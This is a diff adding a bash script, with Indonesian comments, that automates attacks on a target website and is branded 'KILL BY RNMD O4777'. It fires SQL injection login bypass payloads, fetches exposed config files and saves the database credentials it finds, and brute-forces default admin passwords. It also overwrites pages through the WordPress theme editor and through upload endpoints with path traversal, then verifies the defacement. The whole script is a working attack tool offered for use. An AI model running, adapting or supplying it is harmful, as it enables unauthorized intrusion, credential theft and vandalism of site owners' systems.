@@ -1,0 +1,344 @@
+#!/bin/bash
+
+# ==============================================
+# AUTO SCAN DATABASE + DEFACE - KILL BY RNMD O4777
+# ==============================================
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+PURPLE='\033[0;35m'
+CYAN='\033[0;36m'
+WHITE='\033[1;37m'
+NC='\033[0m'
+
+# HTML Deface
+HTML_CONTENT='<!DOCTYPE html>
+<html>
+<head><title>KILL BY RNMD O4777</title>
+<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px}.glitch{font-size:5rem;text-shadow:2px 2px #f00}@keyframes blink{50%{opacity:0}}</style>
+</head>
+<body>
+<h1 class="glitch">KILL BY RNMD O4777</h1>
+<h2>WEB - ERROR</h2>
+<p style="animation:blink 1s infinite">[SYSTEM HALTED]</p>
+</body>
+</html>'
+
+clear
+echo -e "${RED}"
+echo "    ╔═══════════════════════════════════════════════════════════╗"
+echo "    ║     AUTO SCAN DATABASE + DEFACE                          ║"
+echo "    ║     [ FOKUS: ADMIN LOGIN + GANTI TAMPILAN ]             ║"
+echo "    ╚═══════════════════════════════════════════════════════════╝"
+echo -e "${NC}"
+
+echo -ne "${WHITE}Target URL : ${NC}"
+read TARGET
+
+TARGET=$(echo "$TARGET" | sed 's/\/$//')
+DOMAIN=$(echo "$TARGET" | sed -e 's|^https\?://||' -e 's|/.*$||')
+
+echo -e "\n${YELLOW}[•] Target: $TARGET${NC}"
+echo -e "${YELLOW}[•] Domain: $DOMAIN${NC}"
+
+# ==============================================
+# SCAN 1: SQL INJECTION UNTUK LOGIN BYPASS
+# ==============================================
+echo -e "\n${PURPLE}[SCAN 1] SQL Injection untuk Bypass Login${NC}"
+
+SQL_PAYLOADS=(
+    "' OR '1'='1"
+    "' OR 1=1--"
+    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--"
+    "admin'--"
+    "' OR 1=1#"
+    "1' AND 1=1--"
+)
+
+LOGIN_PAGES=(
+    "/wp-login.php"
+    "/admin"
+    "/administrator"
+    "/login"
+    "/user/login"
+    "/auth/login"
+    "/index.php?page=login"
+)
+
+for page in "${LOGIN_PAGES[@]}"; do
+    echo -e "\n${CYAN}  [•] Testing login page: $page${NC}"
+    
+    for payload in "${SQL_PAYLOADS[@]}"; do
+        # Encode payload
+        ENCODED=$(echo "$payload" | sed 's/ /%20/g' | sed "s/'/%27/g")
+        
+        # Coba POST
+        RESPONSE=$(curl -s -k -X POST "$TARGET$page" \
+            -d "username=$ENCODED&password=anything&login=Login" \
+            -H "User-Agent: Mozilla/5.0" \
+            --max-time 5 2>/dev/null)
+        
+        if [[ "$RESPONSE" != *"incorrect"* ]] && [[ "$RESPONSE" != *"error"* ]] && [[ -n "$RESPONSE" ]]; then
+            echo -e "${GREEN}    ✅ Possible SQL injection with: $payload${NC}"
+            
+            # Coba extract admin username
+            ADMIN_USER=$(echo "$RESPONSE" | grep -oE 'Welcome [a-zA-Z0-9_]+' | head -1)
+            if [ -n "$ADMIN_USER" ]; then
+                echo -e "${GREEN}    ✅ Admin user: $ADMIN_USER${NC}"
+            fi
+        fi
+        
+        # Coba GET
+        RESPONSE=$(curl -s -k "$TARGET$page?user=$ENCODED&pass=test" --max-time 5 2>/dev/null)
+        if [[ "$RESPONSE" == *"dashboard"* ]] || [[ "$RESPONSE" == *"admin"* ]]; then
+            echo -e "${GREEN}    ✅ GET injection work with: $payload${NC}"
+        fi
+    done
+done
+
+# ==============================================
+# SCAN 2: DATABASE EXPOSURE
+# ==============================================
+echo -e "\n${PURPLE}[SCAN 2] Database Exposure Scan${NC}"
+
+DB_FILES=(
+    "/.env"
+    "/wp-config.php"
+    "/config.php"
+    "/configuration.php"
+    "/.htaccess"
+    "/database.yml"
+    "/db.php"
+    "/includes/config.php"
+    "/admin/config.php"
+    "/core/config.php"
+    "/application/config/database.php"
+    "/wp-config.php.bak"
+    "/.env.backup"
+)
+
+for file in "${DB_FILES[@]}"; do
+    echo -ne "\r${CYAN}  [•] Checking: $file${NC}"
+    
+    RESPONSE=$(curl -s -k "$TARGET$file" --max-time 3 2>/dev/null)
+    
+    if [[ "$RESPONSE" == *"DB_"* ]] || [[ "$RESPONSE" == *"database"* ]] || [[ "$RESPONSE" == *"mysql"* ]]; then
+        echo -e "\n${GREEN}    ✅ Database file found: $file${NC}"
+        
+        # Extract database credentials
+        DB_HOST=$(echo "$RESPONSE" | grep -E "DB_HOST|host" | head -1)
+        DB_USER=$(echo "$RESPONSE" | grep -E "DB_USER|username" | head -1)
+        DB_PASS=$(echo "$RESPONSE" | grep -E "DB_PASS|password" | head -1)
+        DB_NAME=$(echo "$RESPONSE" | grep -E "DB_NAME|database" | head -1)
+        
+        [ -n "$DB_HOST" ] && echo -e "${YELLOW}      $DB_HOST${NC}"
+        [ -n "$DB_USER" ] && echo -e "${YELLOW}      $DB_USER${NC}"
+        [ -n "$DB_PASS" ] && echo -e "${YELLOW}      $DB_PASS${NC}"
+        [ -n "$DB_NAME" ] && echo -e "${YELLOW}      $DB_NAME${NC}"
+        
+        # Save credentials
+        echo "$TARGET | $DB_USER | $DB_PASS | $DB_NAME" >> db_creds.txt
+    fi
+done
+echo -e "\n${GREEN}  [✓] Database scan selesai${NC}"
+
+# ==============================================
+# SCAN 3: PHPINFO UNTUK DATABASE INFO
+# ==============================================
+echo -e "\n${PURPLE}[SCAN 3] PHP Info Scan${NC}"
+
+PHP_FILES=(
+    "/phpinfo.php"
+    "/info.php"
+    "/test.php"
+    "/infophp.php"
+    "/php-info.php"
+)
+
+for file in "${PHP_FILES[@]}"; do
+    RESPONSE=$(curl -s -k "$TARGET$file" --max-time 3 2>/dev/null)
+    
+    if [[ "$RESPONSE" == *"PHP Version"* ]]; then
+        echo -e "${GREEN}    ✅ PHP info found: $file${NC}"
+        
+        # Extract database info from phpinfo
+        if [[ "$RESPONSE" == *"mysql"* ]]; then
+            echo -e "${YELLOW}      MySQL enabled${NC}"
+        fi
+        if [[ "$RESPONSE" == *"pgsql"* ]]; then
+            echo -e "${YELLOW}      PostgreSQL enabled${NC}"
+        fi
+    fi
+done
+
+# ==============================================
+# SCAN 4: DEFAULT ADMIN CREDENTIALS
+# ==============================================
+echo -e "\n${PURPLE}[SCAN 4] Default Admin Credentials${NC}"
+
+# Common admin usernames and passwords
+ADMIN_USERS=(
+    "admin"
+    "administrator"
+    "root"
+    "user"
+    "admin123"
+    "webmaster"
+    "superadmin"
+    "admin@admin.com"
+)
+
+ADMIN_PASS=(
+    "admin"
+    "password"
+    "123456"
+    "admin123"
+    "root"
+    "toor"
+    "password123"
+    "adminadmin"
+    "12345678"
+    "qwerty"
+    "abc123"
+)
+
+for page in "${LOGIN_PAGES[@]}"; do
+    for user in "${ADMIN_USERS[@]}"; do
+        for pass in "${ADMIN_PASS[@]}"; do
+            echo -ne "\r${CYAN}  [•] Trying $user:$pass on $page${NC}"
+            
+            RESPONSE=$(curl -s -k -X POST "$TARGET$page" \
+                -d "username=$user&password=$pass&login=Login" \
+                -c cookies.txt \
+                --max-time 3 2>/dev/null)
+            
+            if [[ "$RESPONSE" != *"incorrect"* ]] && [[ "$RESPONSE" != *"error"* ]]; then
+                echo -e "\n${GREEN}    ✅ LOGIN SUCCESS! $user:$pass${NC}"
+                
+                # Save credentials
+                echo "$TARGET | $user | $pass" >> admin_creds.txt
+                
+                # Try to upload HTML via admin panel
+                if [[ "$page" == *"wp-admin"* ]]; then
+                    # WordPress - try theme editor
+                    NONCE=$(curl -s -k -b cookies.txt "$TARGET/wp-admin/theme-editor.php" | grep -o 'name="_wpnonce" value="[^"]*"' | cut -d'"' -f4)
+                    
+                    if [ -n "$NONCE" ]; then
+                        curl -s -k -b cookies.txt -X POST "$TARGET/wp-admin/theme-editor.php" \
+                            -d "_wpnonce=$NONCE&action=update&theme=index&file=index.php&newcontent=$(echo "$HTML_CONTENT" | sed 's/ /%20/g')" \
+                            --max-time 5 >/dev/null 2>&1
+                        echo -e "${GREEN}      ✅ Upload via theme editor${NC}"
+                    fi
+                fi
+                break 3
+            fi
+            rm -f cookies.txt
+        done
+    done
+done
+
+# ==============================================
+# SCAN 5: UPLOAD VULNERABILITY (LANGSUNG GANTI INDEX)
+# ==============================================
+echo -e "\n${PURPLE}[SCAN 5] Direct Index Replacement${NC}"
+
+# Save HTML to file
+echo "$HTML_CONTENT" > index.html
+
+# Direct upload attempts to index locations
+INDEX_PATHS=(
+    "/index.html"
+    "/index.php"
+    "/home.html"
+    "/main.html"
+    "/default.html"
+    "/public/index.html"
+    "/public_html/index.html"
+    "/httpdocs/index.html"
+    "/htdocs/index.html"
+    "/var/www/html/index.html"
+    "/www/index.html"
+)
+
+UPLOAD_ENDPOINTS=(
+    "/upload.php"
+    "/filemanager/upload.php"
+    "/admin/upload.php"
+    "/api/upload"
+    "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
+    "/wp-admin/admin-ajax.php"
+)
+
+for endpoint in "${UPLOAD_ENDPOINTS[@]}"; do
+    for index in "${INDEX_PATHS[@]}"; do
+        # Try to upload directly to index location
+        curl -s -k -X POST "$TARGET$endpoint" \
+            -F "file=@index.html;filename=$index" \
+            --max-time 3 >/dev/null 2>&1
+        
+        # Try with path traversal
+        TRAVERSAL=$(echo "$index" | sed 's|/|../|g')
+        curl -s -k -X POST "$TARGET$endpoint" \
+            -F "file=@index.html;filename=$TRAVERSAL" \
+            --max-time 3 >/dev/null 2>&1
+    done
+done
+
+# ==============================================
+# VERIFIKASI HASIL
+# ==============================================
+echo -e "\n${YELLOW}[•] Memeriksa hasil deface...${NC}"
+sleep 2
+
+# Check main URL
+RESULT=$(curl -s -k "$TARGET/" --max-time 5 2>/dev/null)
+
+if [[ "$RESULT" == *"KILL BY RNMD O4777"* ]]; then
+    echo -e "\n${GREEN}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${GREEN}║         ✅  DEFACE BERHASIL!                   ║${NC}"
+    echo -e "${GREEN}║         KILL BY RNMD O4777 AKTIF!              ║${NC}"
+    echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
+    
+    # Show preview
+    echo -e "\n${YELLOW}[•] Preview:${NC}"
+    echo "$RESULT" | grep -o "KILL BY RNMD O4777" --color=always
+    
+    # Save success
+    echo "$TARGET | KILL BY RNMD O4777 | $(date)" >> deface_success.txt
+    
+    # Open browser
+    xdg-open "$TARGET" 2>/dev/null || echo "Buka: $TARGET"
+    
+else
+    echo -e "\n${RED}╔════════════════════════════════════════════════╗${NC}"
+    echo -e "${RED}║         ❌  DEFACE GAGAL                        ║${NC}"
+    echo -e "${RED}║         Tapi data admin mungkin ada:            ║${NC}"
+    echo -e "${RED}╚════════════════════════════════════════════════╝${NC}"
+    
+    # Show found credentials
+    if [ -f admin_creds.txt ]; then
+        echo -e "\n${GREEN}📋 Admin credentials ditemukan:${NC}"
+        cat admin_creds.txt
+    fi
+    
+    if [ -f db_creds.txt ]; then
+        echo -e "\n${GREEN}📋 Database credentials:${NC}"
+        cat db_creds.txt
+    fi
+    
+    # Save HTML
+    echo "$HTML_CONTENT" > "rnmd_o4777.html"
+    echo -e "\n${CYAN}📁 File HTML: rnmd_o4777.html${NC}"
+    echo -e "${YELLOW}Coba upload manual ke:${NC}"
+    echo "  - /public_html/index.html"
+    echo "  - /httpdocs/index.html"
+    echo "  - /var/www/html/index.html"
+fi
+
+# Cleanup
+rm -f index.html cookies.txt 2>/dev/null
+
+echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
+echo -e "${CYAN}🔥 SCAN COMPLETE - KILL BY RNMD O4777 🔥${NC}"
